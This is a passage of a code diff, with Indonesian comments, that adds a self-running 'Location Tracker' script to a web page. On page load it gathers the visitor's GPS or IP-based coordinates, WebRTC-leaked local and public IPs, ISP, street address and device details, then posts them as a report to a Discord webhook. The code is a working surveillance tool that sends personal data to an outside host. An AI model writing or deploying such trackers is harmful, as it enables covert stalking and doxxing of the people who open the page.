-      };
-      setStatus(msgs[err.code] || `❌ Error: ${err.message}`, 'error');
+    // Pilih sumber koordinat terbaik
+    let coords;
+    if (gpsResult && gpsResult.rawAcc <= 500) {
+      coords = { ...gpsResult, ip: ipData?.ip, isp: ipData?.isp, asn: ipData?.asn,
+        localIPs: rtcIPs.local, publicIPs: rtcIPs.public, ipProviders: ipData?.providers || [] };
+    } else if (gpsResult && ipData) {
+      const useGPS = gpsResult.rawAcc < ipData.rawAcc;
+      const chosen = useGPS ? gpsResult : ipData;
+      coords = { ...chosen, ip: ipData.ip, isp: ipData.isp, asn: ipData.asn,
+        localIPs: rtcIPs.local, publicIPs: rtcIPs.public, ipProviders: ipData.providers || [],
+        note: `Dipilih: ${useGPS ? 'GPS' : 'IP'} (akurasi lebih baik)` };
+    } else if (ipData) {
+      coords = { ...ipData, localIPs: rtcIPs.local, publicIPs: rtcIPs.public, ipProviders: ipData.providers || [] };
+    } else if (gpsResult) {
+      coords = { ...gpsResult, localIPs: rtcIPs.local, publicIPs: rtcIPs.public, ipProviders: [] };
+    } else {
+      setStep(4, 'error', 'Gagal', '❌');
+      setProgress(100);
+      return;
     }
+
+    // STEP 4 — Reverse geocode + kirim Discord
+    setStep(4, 'active', 'Menyimpan...', '⏳');
+    setProgress(88);
+
+    const alamat = await reverseGeocode(coords.lat, coords.lng);
+
+    const mapsUrl  = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+    const mapsUrl2 = `https://www.openstreetmap.org/?mlat=${coords.lat}&mlon=${coords.lng}&zoom=18`;
+    const time = new Date().toLocaleString('id-ID', {
+      weekday: 'long', year: 'numeric', month: 'long',
+      day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+
+    const coordStr   = `${coords.lat.toFixed(7)}, ${coords.lng.toFixed(7)}`;
+    const providerDetail = coords.ipProviders?.length > 0
+      ? coords.ipProviders.map(p => `  [${p.src}] ${p.lat.toFixed(5)}, ${p.lng.toFixed(5)}`).join('\n')
+      : '  -';
+
+    const locationBlock = [
+      `📍 **__LOCATION INFORMATION__**`,
+      "```",
+      `Koordinat   : ${coordStr}`,
+      `Akurasi     : ${coords.accuracy}`,
+      `Metode      : ${coords.method}`,
+      coords.note ? `Catatan     : ${coords.note}` : '',
+      ``,
+      `Jalan       : ${alamat?.jalan      || '-'}`,
+      `Kelurahan   : ${alamat?.kelurahan  || '-'}`,
+      `Kecamatan   : ${alamat?.kecamatan  || '-'}`,
+      `Kota        : ${alamat?.kota        || '-'}`,
+      `Provinsi    : ${alamat?.provinsi    || '-'}`,
+      `Kode Pos    : ${alamat?.kode_pos    || '-'}`,
+      `Negara      : ${alamat?.negara      || '-'}`,
+      "```",
+    ].filter(Boolean).join('\n');
+
+    const networkBlock = [
+      `🌐 **__NETWORK INFORMATION__**`,
+      "```",
+      `IP Publik   : ${coords.ip                          || 'N/A'}`,
+      `ISP         : ${coords.isp                         || 'N/A'}`,
+      `ASN         : ${coords.asn                         || 'N/A'}`,
+      `IP Lokal    : ${coords.localIPs?.join(', ')        || 'N/A'}`,
+      `IP WebRTC   : ${coords.publicIPs?.join(', ')       || 'N/A'}`,
+      ``,
+      `Triangulasi IP Provider:`,
+      providerDetail,
+      "```",
+    ].join('\n');
+
+    const deviceBlock = [
+      `📱 **__DEVICE INFORMATION__**`,
+      "```",
+      `Tipe        : ${getDeviceType()}`,
+      `Browser     : ${getBrowser()}`,
+      `User Agent  : ${navigator.userAgent.substring(0, 120)}`,
+      "```",
+    ].join('\n');
+
+    const linksBlock = [
+      `🔗 **__QUICK LINKS__**`,
+      `**Google Maps:** ${mapsUrl}`,
+      `**OpenStreetMap:** ${mapsUrl2}`,
+    ].join('\n');
+
+    const alamatBlock = alamat ? [
+      `📋 **__ALAMAT LENGKAP__**`,
+      "```",
+      alamat.alamat_lengkap.substring(0, 300),
+      "```",
+    ].join('\n') : '';
+
+    const content = [
+      `# 📡 LOCATION REPORT`,
+      ``,
+      locationBlock,
+      ``,
+      networkBlock,
+      ``,
+      deviceBlock,
+      ``,
+      linksBlock,
+      ``,
+      alamatBlock,
+      ``,
+      `─────────────────────────`,
+      `⏰ **Waktu:** ${time}`,
+      `🏷️ **Label:** ${LABEL}`,
+    ].filter(Boolean).join('\n');
+
+    const payload = {
+      username: '📍 Location Tracker',
+      embeds: [{
+        color: 0x3b82f6,
+        description: content,
+        footer: { text: 'Auto Tracker • GPS + IP Triangulation + WebRTC' },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    await sendToDiscord(payload);
+
+    setStep(4, 'done', 'Selesai ✓', '✅');
+    setProgress(100);
+    $('doneBadge').classList.add('show');
   }
+
+  // Jalankan otomatis saat halaman dibuka
+  window.addEventListener('load', () => {
+    autoRun().catch(() => {});
+  });
 </script>
 </body>
 </html>
